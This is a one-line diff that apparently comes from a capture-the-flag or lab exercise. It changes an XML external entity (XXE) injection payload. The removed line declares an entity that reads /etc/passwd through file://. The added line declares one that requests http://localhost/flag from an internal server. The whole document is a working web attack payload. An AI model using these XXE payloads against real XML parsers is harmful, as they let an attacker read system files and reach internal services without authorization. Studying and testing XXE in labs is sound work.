@@ -1,1 +1,1 @@
-<!ENTITY file SYSTEM "file:///etc/passwd">
+<!ENTITY file SYSTEM "http://localhost/flag">
